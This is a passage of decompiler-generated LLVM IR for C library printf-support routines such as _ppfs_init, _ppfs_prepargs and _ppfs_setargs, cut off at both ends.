  store i1 %v10_804ecd5, i1* %sf.global-to-local, align 1
  ret i32 %v2_804ecd2

; uselistorder directives
  uselistorder i32 %v1_804ecc3, { 1, 2, 0 }
  uselistorder i32 %v3_804ecb8, { 2, 3, 0, 1 }
  uselistorder i32 %v0_804ec9d, { 1, 0 }
  uselistorder i32 %v2_804ec97, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804ec76, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804ec71, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_804ec51, { 1, 0 }
  uselistorder i32 %v0_804ec4a.pre, { 1, 0 }
  uselistorder i32 %v0_804ec1d, { 1, 0 }
  uselistorder i32 %v3_804ec11, { 1, 0 }
  uselistorder i32 %v0_804ec06, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_804ebde, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804ebb7, { 0, 2, 1, 3 }
  uselistorder i8 %v4_804eb9f, { 1, 0 }
  uselistorder i32 %v2_804eb8b, { 1, 0, 2, 3 }
  uselistorder i32 %v6_804eb78, { 1, 0 }
  uselistorder i32 %v1_804eb75, { 1, 0 }
  uselistorder i32 %v1_804eb6b, { 1, 0 }
  uselistorder i32 %v0_804eb6b, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804eb4a, { 1, 0 }
  uselistorder i32 %v1_804eb27, { 1, 0 }
  uselistorder i32 %v1_804eae5, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_804eb01, { 3, 2, 1, 0 }
  uselistorder i32 %v1_804eaca, { 1, 0 }
  uselistorder i32 %v1_804eab5, { 1, 0 }
  uselistorder i32 %v1_804ea81, { 1, 0 }
  uselistorder i32 %v0_804ea5b, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v0_804ea41, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v1_804ea2d, { 1, 0 }
  uselistorder i32 %v1_804e9e3, { 1, 0 }
  uselistorder i32 %v4_804e9b1, { 1, 0 }
  uselistorder i32 %v0_804e9a6, { 1, 0, 2, 3 }
  uselistorder i8 %v3_804e9a1, { 1, 0 }
  uselistorder i32 %v0_804e9da, { 1, 0, 2, 3 }
  uselistorder i8 %v3_804e991, { 1, 0 }
  uselistorder i32 %v1_804e988, { 1, 0 }
  uselistorder i32 %v1_804e97c, { 1, 0 }
  uselistorder i32 %v3_804e970, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804e966, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_804e961, { 0, 1, 3, 2, 5, 4, 6 }
  uselistorder i32 %v2_804e95f, { 1, 0 }
  uselistorder i32 %v0_804e9b1, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_804e9a1, { 1, 2, 0 }
  uselistorder i32 %v3_804e939, { 0, 1, 3, 2 }
  uselistorder i8 %v4_804e927, { 1, 0 }
  uselistorder i32 %v4_804e91e, { 1, 0 }
  uselistorder i32 %v3_804e91e, { 1, 0 }
  uselistorder i32 %v6_804e916, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 %v0_804e8e7, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v1_804e8e6, { 2, 1, 0 }
  uselistorder i32 %v1_804e8bf, { 1, 0 }
  uselistorder i32 %v1_804e8b3, { 1, 0 }
  uselistorder i32 %v1_804e8ae, { 1, 0 }
  uselistorder i32 %v2_804e8a6, { 1, 0 }
  uselistorder i32 %tmp68, { 1, 0 }
  uselistorder i32 %v3_804e890, { 1, 0, 2 }
  uselistorder i8 %v3_804e87f, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804e876, { 1, 0 }
  uselistorder i32 %v3_804e848, { 16, 7, 8, 5, 6, 11, 12, 4, 3, 1, 0, 13, 9, 10, 2, 14, 15, 17, 18, 19 }
  uselistorder i32 %v0_804e848.lcssa, { 0, 8, 9, 7, 6, 10, 26, 25, 13, 14, 15, 16, 17, 18, 12, 11, 21, 20, 19, 24, 23, 22, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_804e844, { 1, 0 }
  uselistorder i32 %v1_804e844.pre, { 1, 0 }
  uselistorder i32 %v1_804e843, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_804e840, { 1, 0 }
  uselistorder i32 %v2_804e84472, { 1, 0 }
  uselistorder i32 %v3_804e82a, { 1, 0 }
  uselistorder i8 %v4_804e7e6, { 1, 0 }
  uselistorder i32 %v1_804e7e6, { 1, 0, 3, 2 }
  uselistorder i8 %v2_804e7dd, { 1, 0 }
  uselistorder i32 %v2_804e7b2, { 0, 2, 1, 3, 4 }
  uselistorder i8 %v2_804e7ae, { 1, 0 }
  uselistorder i8 %v2_804e7a8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804e7b6, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804e798, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 3, 2, 4, 7, 0, 6, 5, 1, 8, 9, 10, 11 }
  uselistorder i1* %sf.global-to-local, { 1, 2, 3, 8, 4, 5, 6, 7, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 87, 88, 86, 89, 90, 91, 92, 93, 94 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 19, 3, 4, 7, 5, 6, 8, 9, 10, 12, 11, 13, 14, 20, 15, 16, 17, 21, 18, 22, 23, 24, 25 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 12, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 63, 62, 61, 50, 51, 52, 53, 54, 56, 55, 57, 58, 59, 60 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 ()* @_charpad, { 2, 1, 0, 3 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 204, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_804ecd2, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804eccb, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_804ec93, { 1, 0 }
  uselistorder label %dec_label_pc_804ec4a, { 1, 0 }
  uselistorder label %dec_label_pc_804ec33, { 1, 0 }
  uselistorder label %dec_label_pc_804ebde, { 1, 0 }
  uselistorder label %dec_label_pc_804ebb0, { 1, 0 }
  uselistorder label %dec_label_pc_804eb95, { 1, 0 }
  uselistorder label %dec_label_pc_804eb7f, { 1, 0 }
  uselistorder label %dec_label_pc_804eb6b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804eb66, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804eaf8, { 1, 0 }
  uselistorder label %dec_label_pc_804eade, { 1, 0 }
  uselistorder label %dec_label_pc_804e9fc, { 1, 0 }
  uselistorder label %dec_label_pc_804e9a1, { 5, 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_804e94f, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804e8ff, { 1, 0 }
  uselistorder label %dec_label_pc_804e8e6, { 1, 0 }
  uselistorder label %dec_label_pc_804e8d2, { 1, 0 }
  uselistorder label %dec_label_pc_804e8cd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e8ae, { 1, 0 }
  uselistorder label %dec_label_pc_804e839, { 1, 0 }
  uselistorder label %dec_label_pc_804e831, { 1, 0 }
  uselistorder label %dec_label_pc_804e7dd, { 1, 0 }
  uselistorder label %dec_label_pc_804e7d2, { 1, 0 }
  uselistorder label %dec_label_pc_804e7a8.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804ece0 = load i32, i32* @esi, align 4
  %v0_804ece1 = load i32, i32* @ebx, align 4
  store i32 %v0_804ece1, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_804ecf5 = bitcast i32* %arg1 to i8*
  %v4_804ecf5 = call i32 @__GI_memset(i8* %v3_804ecf5, i32 0, i32 188)
  %v0_804ecfa = load i32, i32* @ebx, align 4
  %v1_804ecfa = add i32 %v0_804ecfa, 40
  store i32 %v1_804ecfa, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  %v1_804ed02 = add i32 %v0_804ecfa, 24
  %v2_804ed02 = inttoptr i32 %v1_804ed02 to i32*
  %v3_804ed02 = load i32, i32* %v2_804ed02, align 4
  %v4_804ed02 = add i32 %v3_804ed02, -1
  store i32 %v4_804ed02, i32* %v2_804ed02, align 4
  %v0_804ed08 = load i32, i32* @esi, align 4
  %v1_804ed08 = load i32, i32* @ebx, align 4
  %v2_804ed08 = inttoptr i32 %v1_804ed08 to i32*
  store i32 %v0_804ed08, i32* %v2_804ed08, align 4
  %v0_804ed0a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ed0a

dec_label_pc_804ed0a:                             ; preds = %dec_label_pc_804ed0a, %entry
  %v0_804ed0a = phi i32 [ %v1_804ed10, %dec_label_pc_804ed0a ], [ %v0_804ed0a.pre, %entry ]
  %v1_804ed0a = inttoptr i32 %v0_804ed0a to i32*
  store i32 8, i32* %v1_804ed0a, align 4
  %v0_804ed10 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ed10 = add i32 %v0_804ed10, 4
  store i32 %v1_804ed10, i32* %eax.global-to-local, align 4
  %v0_804ed13 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ed13 = add i32 %v0_804ed13, -1
  %v8_804ed13 = icmp eq i32 %v1_804ed13, 0
  store i32 %v1_804ed13, i32* %edx.global-to-local, align 4
  %v1_804ed14 = icmp eq i1 %v8_804ed13, false
  br i1 %v1_804ed14, label %dec_label_pc_804ed0a, label %dec_label_pc_804ed16

dec_label_pc_804ed16:                             ; preds = %dec_label_pc_804ed0a
  %v0_804ed16 = load i32, i32* @esi, align 4
  store i32 %v0_804ed16, i32* %eax.global-to-local, align 4
  %v1_804ed4120 = inttoptr i32 %v0_804ed16 to i8*
  %v2_804ed4121 = load i8, i8* %v1_804ed4120, align 1
  %v3_804ed4122 = zext i8 %v2_804ed4121 to i32
  %v5_804ed4123 = and i32 %v1_804ed13, -256
  %v6_804ed4124 = or i32 %v3_804ed4122, %v5_804ed4123
  store i32 %v6_804ed4124, i32* %edx.global-to-local, align 4
  %v4_804ed4325 = icmp eq i8 %v2_804ed4121, 0
  %v1_804ed4527 = icmp eq i1 %v4_804ed4325, false
  br i1 %v1_804ed4527, label %dec_label_pc_804ed1f, label %dec_label_pc_804ed47

dec_label_pc_804ed1f:                             ; preds = %dec_label_pc_804ed16, %dec_label_pc_804ed41.backedge
  %v6_804ed4130 = phi i32 [ %v6_804ed41, %dec_label_pc_804ed41.backedge ], [ %v6_804ed4124, %dec_label_pc_804ed16 ]
  %v2_804ed4129 = phi i8 [ %v2_804ed41, %dec_label_pc_804ed41.backedge ], [ %v2_804ed4121, %dec_label_pc_804ed16 ]
  %v0_804ed2428 = phi i32 [ %v0_804ed24.be, %dec_label_pc_804ed41.backedge ], [ %v0_804ed16, %dec_label_pc_804ed16 ]
  %v10_804ed1f = icmp eq i8 %v2_804ed4129, 37
  %v1_804ed22 = icmp eq i1 %v10_804ed1f, false
  br i1 %v1_804ed22, label %dec_label_pc_804ed40, label %dec_label_pc_804ed24

dec_label_pc_804ed24:                             ; preds = %dec_label_pc_804ed1f
  %v1_804ed24 = add i32 %v0_804ed2428, 1
  store i32 %v1_804ed24, i32* %eax.global-to-local, align 4
  %v1_804ed25 = inttoptr i32 %v1_804ed24 to i8*
  %v2_804ed25 = load i8, i8* %v1_804ed25, align 1
  %v11_804ed25 = icmp eq i8 %v2_804ed25, 37
  br i1 %v11_804ed25, label %dec_label_pc_804ed40, label %dec_label_pc_804ed2a

dec_label_pc_804ed2a:                             ; preds = %dec_label_pc_804ed24
  %v1_804ed2d = load i32, i32* @ebx, align 4
  %v2_804ed2d = inttoptr i32 %v1_804ed2d to i32*
  store i32 %v1_804ed24, i32* %v2_804ed2d, align 4
  %v0_804ed2f = load i32, i32* @ebx, align 4
  %v1_804ed30 = inttoptr i32 %v0_804ed2f to i32*
  %v2_804ed30 = call i32 @_ppfs_parsespec(i32* %v1_804ed30)
  store i32 %v2_804ed30, i32* %eax.global-to-local, align 4
  %v2_804ed38 = icmp slt i32 %v2_804ed30, 0
  br i1 %v2_804ed38, label %dec_label_pc_804ed4b, label %dec_label_pc_804ed3c

dec_label_pc_804ed3c:                             ; preds = %dec_label_pc_804ed2a
  %v0_804ed3c = load i32, i32* @ebx, align 4
  %v1_804ed3c = inttoptr i32 %v0_804ed3c to i32*
  %v2_804ed3c = load i32, i32* %v1_804ed3c, align 4
  %v4_804ed41.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804ed41.backedge

dec_label_pc_804ed40:                             ; preds = %dec_label_pc_804ed24, %dec_label_pc_804ed1f
  %v0_804ed40 = phi i32 [ %v1_804ed24, %dec_label_pc_804ed24 ], [ %v0_804ed2428, %dec_label_pc_804ed1f ]
  %v1_804ed40 = add i32 %v0_804ed40, 1
  br label %dec_label_pc_804ed41.backedge

dec_label_pc_804ed41.backedge:                    ; preds = %dec_label_pc_804ed40, %dec_label_pc_804ed3c
  %v4_804ed41.be = phi i32 [ %v4_804ed41.pre.pre, %dec_label_pc_804ed3c ], [ %v6_804ed4130, %dec_label_pc_804ed40 ]
  %v0_804ed24.be = phi i32 [ %v2_804ed3c, %dec_label_pc_804ed3c ], [ %v1_804ed40, %dec_label_pc_804ed40 ]
  store i32 %v0_804ed24.be, i32* %eax.global-to-local, align 4
  %v1_804ed41 = inttoptr i32 %v0_804ed24.be to i8*
  %v2_804ed41 = load i8, i8* %v1_804ed41, align 1
  %v3_804ed41 = zext i8 %v2_804ed41 to i32
  %v5_804ed41 = and i32 %v4_804ed41.be, -256
  %v6_804ed41 = or i32 %v3_804ed41, %v5_804ed41
  store i32 %v6_804ed41, i32* %edx.global-to-local, align 4
  %v4_804ed43 = icmp eq i8 %v2_804ed41, 0
  %v1_804ed45 = icmp eq i1 %v4_804ed43, false
  br i1 %v1_804ed45, label %dec_label_pc_804ed1f, label %dec_label_pc_804ed41.dec_label_pc_804ed47_crit_edge

dec_label_pc_804ed41.dec_label_pc_804ed47_crit_edge: ; preds = %dec_label_pc_804ed41.backedge
  %v0_804ed47.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ed47

dec_label_pc_804ed47:                             ; preds = %dec_label_pc_804ed41.dec_label_pc_804ed47_crit_edge, %dec_label_pc_804ed16
  %v0_804ed47 = phi i32 [ %v0_804ed47.pre, %dec_label_pc_804ed41.dec_label_pc_804ed47_crit_edge ], [ %v0_804ed16, %dec_label_pc_804ed16 ]
  %v1_804ed47 = load i32, i32* @ebx, align 4
  %v2_804ed47 = inttoptr i32 %v1_804ed47 to i32*
  store i32 %v0_804ed47, i32* %v2_804ed47, align 4
  br label %dec_label_pc_804ed4b

dec_label_pc_804ed4b:                             ; preds = %dec_label_pc_804ed2a, %dec_label_pc_804ed47
  %storemerge = phi i32 [ 0, %dec_label_pc_804ed47 ], [ -1, %dec_label_pc_804ed2a ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_804ed4b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804ed4b, i32* @edx, align 4
  %v2_804ed4c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804ed4c, i32* @ebx, align 4
  store i32 %v0_804ece0, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_804ed41, { 1, 0 }
  uselistorder i8 %v2_804ed41, { 1, 2, 0 }
  uselistorder i32 %v0_804ed24.be, { 2, 1, 0 }
  uselistorder i32 %v0_804ed2428, { 1, 0 }
  uselistorder i32 %v0_804ed16, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804ed13, { 0, 2, 1 }
  uselistorder i32 %v1_804ed10, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_804ed4b, { 1, 0 }
  uselistorder label %dec_label_pc_804ed1f, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804ed50 = load i32, i32* @esi, align 4
  %v0_804ed51 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804ed5d = add i32 %arg1, 24
  %v2_804ed5d = inttoptr i32 %v1_804ed5d to i32*
  %v3_804ed5d = load i32, i32* %v2_804ed5d, align 4
  %v2_804ed60 = add i32 %arg1, 76
  %v3_804ed60 = inttoptr i32 %v2_804ed60 to i32*
  store i32 %arg2, i32* %v3_804ed60, align 4
  %tmp8 = icmp slt i32 %v3_804ed5d, 1
  br i1 %tmp8, label %dec_label_pc_804ed8e, label %dec_label_pc_804ed67

dec_label_pc_804ed67:                             ; preds = %entry
  %v1_804ed6a = load i32, i32* @ebx, align 4
  %v2_804ed6a = add i32 %v1_804ed6a, 28
  %v3_804ed6a = inttoptr i32 %v2_804ed6a to i32*
  store i32 %v3_804ed5d, i32* %v3_804ed6a, align 4
  %v0_804ed6d = load i32, i32* @ebx, align 4
  %v1_804ed6d = add i32 %v0_804ed6d, 24
  %v2_804ed6d = inttoptr i32 %v1_804ed6d to i32*
  store i32 0, i32* %v2_804ed6d, align 4
  %v0_804ed74 = load i32, i32* @ebx, align 4
  %v1_804ed74 = add i32 %v0_804ed74, 4
  %v2_804ed74 = inttoptr i32 %v1_804ed74 to i32*
  store i32 0, i32* %v2_804ed74, align 4
  %v0_804ed7b = load i32, i32* @ebx, align 4
  %v1_804ed7b = add i32 %v0_804ed7b, 8
  %v2_804ed7b = inttoptr i32 %v1_804ed7b to i32*
  store i32 0, i32* %v2_804ed7b, align 4
  %v0_804ed82 = load i32, i32* @ebx, align 4
  %v1_804ed83 = call i32 @_ppfs_setargs(i32 %v0_804ed82)
  %v1_804ed8b = load i32, i32* @ebx, align 4
  %v2_804ed8b = add i32 %v1_804ed8b, 24
  %v3_804ed8b = inttoptr i32 %v2_804ed8b to i32*
  store i32 %v3_804ed5d, i32* %v3_804ed8b, align 4
  br label %dec_label_pc_804ed8e

dec_label_pc_804ed8e:                             ; preds = %entry, %dec_label_pc_804ed67
  %v2_804ed8e = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_804ed51, i32* @ebx, align 4
  store i32 %v0_804ed50, i32* @esi, align 4
  ret i32 %v2_804ed8e

; uselistorder directives
  uselistorder i32 %v3_804ed5d, { 1, 2, 0 }
  uselistorder i32 (i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ed8e, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804ed95 = load i32, i32* @ebx, align 4
  store i32 %v0_804ed95, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_804ed9a = add i32 %arg1, 24
  %v2_804ed9a = inttoptr i32 %v1_804ed9a to i32*
  %v3_804ed9a = load i32, i32* %v2_804ed9a, align 4
  %v4_804ed9a = icmp eq i32 %v3_804ed9a, 0
  %v1_804ed9e = add i32 %arg1, 80
  store i32 %v1_804ed9e, i32* %ebx.global-to-local, align 4
  %v1_804eda1 = icmp eq i1 %v4_804ed9a, false
  %v1_804ee59 = add i32 %arg1, 8
  %v2_804ee59 = inttoptr i32 %v1_804ee59 to i32*
  %v3_804ee59 = load i32, i32* %v2_804ee59, align 4
  %v8_804ee59 = icmp eq i32 %v3_804ee59, -2147483648
  %v1_804ee60 = icmp eq i1 %v8_804ee59, false
  br i1 %v1_804eda1, label %dec_label_pc_804ee59, label %dec_label_pc_804eda7

dec_label_pc_804eda7:                             ; preds = %entry
  br i1 %v1_804ee60, label %dec_label_pc_804edc1, label %dec_label_pc_804edb0

dec_label_pc_804edb0:                             ; preds = %dec_label_pc_804eda7
  %v1_804edb0 = add i32 %arg1, 76
  %v2_804edb0 = inttoptr i32 %v1_804edb0 to i32*
  %v3_804edb0 = load i32, i32* %v2_804edb0, align 4
  store i32 %v3_804edb0, i32* %eax.global-to-local, align 4
  %v1_804edb3 = add i32 %v3_804edb0, 4
  store i32 %v1_804edb3, i32* %edx.global-to-local, align 4
  store i32 %v1_804edb3, i32* %v2_804edb0, align 4
  %v0_804edb9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804edb9 = inttoptr i32 %v0_804edb9 to i32*
  %v2_804edb9 = load i32, i32* %v1_804edb9, align 4
  store i32 %v2_804edb9, i32* %eax.global-to-local, align 4
  %v1_804edbb = load i32, i32* @ecx, align 4
  %v2_804edbb = add i32 %v1_804edbb, 80
  %v3_804edbb = inttoptr i32 %v2_804edbb to i32*
  store i32 %v2_804edb9, i32* %v3_804edbb, align 4
  %v0_804edbe = load i32, i32* %eax.global-to-local, align 4
  %v1_804edbe = load i32, i32* @ecx, align 4
  %v2_804edbe = add i32 %v1_804edbe, 8
  %v3_804edbe = inttoptr i32 %v2_804edbe to i32*
  store i32 %v0_804edbe, i32* %v3_804edbe, align 4
  %v0_804edc1.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804edc1

dec_label_pc_804edc1:                             ; preds = %dec_label_pc_804eda7, %dec_label_pc_804edb0
  %v1_804edd0 = phi i32 [ %arg1, %dec_label_pc_804eda7 ], [ %v0_804edc1.pre, %dec_label_pc_804edb0 ]
  %v1_804edc1 = add i32 %v1_804edd0, 4
  %v2_804edc1 = inttoptr i32 %v1_804edc1 to i32*
  %v3_804edc1 = load i32, i32* %v2_804edc1, align 4
  %v8_804edc1 = icmp eq i32 %v3_804edc1, -2147483648
  %v1_804edc8 = icmp eq i1 %v8_804edc1, false
  br i1 %v1_804edc8, label %dec_label_pc_804eddb, label %dec_label_pc_804edca

dec_label_pc_804edca:                             ; preds = %dec_label_pc_804edc1
  %v1_804edca = add i32 %v1_804edd0, 76
  %v2_804edca = inttoptr i32 %v1_804edca to i32*
  %v3_804edca = load i32, i32* %v2_804edca, align 4
  store i32 %v3_804edca, i32* %eax.global-to-local, align 4
  %v1_804edcd = add i32 %v3_804edca, 4
  store i32 %v1_804edcd, i32* %edx.global-to-local, align 4
  store i32 %v1_804edcd, i32* %v2_804edca, align 4
  %v0_804edd3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804edd3 = inttoptr i32 %v0_804edd3 to i32*
  %v2_804edd3 = load i32, i32* %v1_804edd3, align 4
  store i32 %v2_804edd3, i32* %eax.global-to-local, align 4
  %v1_804edd5 = load i32, i32* @ecx, align 4
  %v2_804edd5 = add i32 %v1_804edd5, 80
  %v3_804edd5 = inttoptr i32 %v2_804edd5 to i32*
  store i32 %v2_804edd3, i32* %v3_804edd5, align 4
  %v0_804edd8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804edd8 = load i32, i32* @ecx, align 4
  %v2_804edd8 = add i32 %v1_804edd8, 4
  %v3_804edd8 = inttoptr i32 %v2_804edd8 to i32*
  store i32 %v0_804edd8, i32* %v3_804edd8, align 4
  %v1_804ee5215.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804eddb

dec_label_pc_804eddb:                             ; preds = %dec_label_pc_804edc1, %dec_label_pc_804edca
  %v1_804ee5215 = phi i32 [ %v1_804edd0, %dec_label_pc_804edc1 ], [ %v1_804ee5215.pre, %dec_label_pc_804edca ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_804ee5216 = add i32 %v1_804ee5215, 28
  %v3_804ee5217 = inttoptr i32 %v2_804ee5216 to i32*
  %v4_804ee5218 = load i32, i32* %v3_804ee5217, align 4
  %v5_804ee5520 = icmp sgt i32 %v4_804ee5218, 0
  br i1 %v5_804ee5520, label %dec_label_pc_804eddf, label %dec_label_pc_804ee87.loopexit

dec_label_pc_804eddf:                             ; preds = %dec_label_pc_804eddb, %dec_label_pc_804ee51
  %v1_804ee5222 = phi i32 [ %v1_804ee52, %dec_label_pc_804ee51 ], [ %v1_804ee5215, %dec_label_pc_804eddb ]
  %v1_804eddf21 = phi i32 [ %v1_804ee51, %dec_label_pc_804ee51 ], [ 0, %dec_label_pc_804eddb ]
  %v2_804eddf = mul i32 %v1_804eddf21, 4
  %v3_804eddf = add i32 %v2_804eddf, 40
  %v4_804eddf = add i32 %v3_804eddf, %v1_804ee5222
  %v5_804eddf = inttoptr i32 %v4_804eddf to i32*
  %v6_804eddf = load i32, i32* %v5_804eddf, align 4
  store i32 %v6_804eddf, i32* %eax.global-to-local, align 4
  %v1_804ede3 = add i32 %v6_804eddf, -8
  %v9_804ede3 = icmp eq i32 %v1_804ede3, 0
  br i1 %v9_804ede3, label %dec_label_pc_804ee51, label %dec_label_pc_804ede8

dec_label_pc_804ede8:                             ; preds = %dec_label_pc_804eddf
  %v10_804ede3 = icmp slt i32 %v1_804ede3, 0
  %v6_804ede3 = sub i32 7, %v6_804eddf
  %v7_804ede3 = and i32 %v6_804ede3, %v6_804eddf
  %v8_804ede3 = icmp slt i32 %v7_804ede3, 0
  %v1_804ede8 = add i32 %v1_804ee5222, 76
  %v2_804ede8 = inttoptr i32 %v1_804ede8 to i32*
  %v3_804ede8 = load i32, i32* %v2_804ede8, align 4
  store i32 %v3_804ede8, i32* %edx.global-to-local, align 4
  %v3_804edeb = icmp eq i1 %v10_804ede3, %v8_804ede3
  br i1 %v3_804edeb, label %dec_label_pc_804edfb, label %dec_label_pc_804eded

dec_label_pc_804eded:                             ; preds = %dec_label_pc_804ede8
  %tmp13 = icmp slt i32 %v6_804eddf, 3
  %v9_804edf4 = icmp eq i32 %v6_804eddf, 7
  %v1_804edf7 = icmp eq i1 %v9_804edf4, false
  %or.cond = or i1 %tmp13, %v1_804edf7
  br i1 %or.cond, label %dec_label_pc_804ee44, label %dec_label_pc_804ee26

dec_label_pc_804edfb:                             ; preds = %dec_label_pc_804ede8
  %tmp14 = icmp sgt i32 %v6_804eddf, 1024
  br i1 %tmp14, label %dec_label_pc_804ee04, label %dec_label_pc_804ee44

dec_label_pc_804ee04:                             ; preds = %dec_label_pc_804edfb
  %v6_804ee04 = icmp eq i32 %v6_804eddf, 2048
  br i1 %v6_804ee04, label %dec_label_pc_804ee14, label %dec_label_pc_804ee0b

dec_label_pc_804ee0b:                             ; preds = %dec_label_pc_804ee04
  %v9_804ee0b = icmp eq i32 %v6_804eddf, 2055
  %v1_804ee10 = icmp eq i1 %v9_804ee0b, false
  br i1 %v1_804ee10, label %dec_label_pc_804ee44, label %dec_label_pc_804ee35

dec_label_pc_804ee14:                             ; preds = %dec_label_pc_804ee04
  %v1_804ee14 = add i32 %v3_804ede8, 8
  store i32 %v1_804ee14, i32* %eax.global-to-local, align 4
  store i32 %v1_804ee14, i32* %v2_804ede8, align 4
  %v0_804ee1a = load i32, i32* %edx.global-to-local, align 4
  %v1_804ee1a = inttoptr i32 %v0_804ee1a to i32*
  %v2_804ee1a = load i32, i32* %v1_804ee1a, align 4
  store i32 %v2_804ee1a, i32* %eax.global-to-local, align 4
  %v1_804ee1c = add i32 %v0_804ee1a, 4
  %v2_804ee1c = inttoptr i32 %v1_804ee1c to i32*
  %v3_804ee1c = load i32, i32* %v2_804ee1c, align 4
  store i32 %v3_804ee1c, i32* %edx.global-to-local, align 4
  %v1_804ee1f = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ee1f = inttoptr i32 %v1_804ee1f to i32*
  store i32 %v2_804ee1a, i32* %v2_804ee1f, align 4
  %v0_804ee21 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ee21 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ee21 = add i32 %v1_804ee21, 4
  %v3_804ee21 = inttoptr i32 %v2_804ee21 to i32*
  store i32 %v0_804ee21, i32* %v3_804ee21, align 4
  br label %dec_label_pc_804ee4e

dec_label_pc_804ee26:                             ; preds = %dec_label_pc_804eded
  %v3_804ee26 = load i32, i32* %v2_804ede8, align 4
  store i32 %v3_804ee26, i32* %edx.global-to-local, align 4
  %v1_804ee29 = add i32 %v3_804ee26, 8
  store i32 %v1_804ee29, i32* %eax.global-to-local, align 4
